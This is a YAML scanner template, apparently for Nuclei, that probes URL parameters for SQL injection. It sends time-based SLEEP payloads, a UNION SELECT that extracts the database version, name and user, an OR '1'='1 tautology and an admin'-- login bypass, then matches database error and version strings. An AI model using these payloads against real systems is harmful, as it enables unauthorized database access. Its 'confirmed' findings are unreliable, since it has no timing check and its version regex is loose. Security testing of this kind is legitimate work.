id: THENAWABX_CONFIRMED_SQLI
info:
  name: 💉 Nawab-Confirmed-SQLi-Hunter 💉
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
      - "{{BaseURL}}?id=1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
      - "{{BaseURL}}?id=1' UNION SELECT NULL,@@version,DATABASE(),USER()--"
      - "{{BaseURL}}?query=1' OR '1'='1"
      - "{{BaseURL}}?user=admin'--"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "(SQL syntax.*?MySQL|Warning.*?mysqli_query|PostgreSQL.*?ERROR|SQLite/JDBCDriver|Oracle error.*?ORA-[0-9]+)"
          - "(?i)(database_user|database_name|database_version)"
          - "(5\\.[0-9]+\\.[0-9]+|8\\.[0-9]+\\.[0-9]+)"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - "(MySQL|PostgreSQL|Oracle|SQLite|MariaDB) [0-9]+\\.[0-9]+\\.[0-9]+"
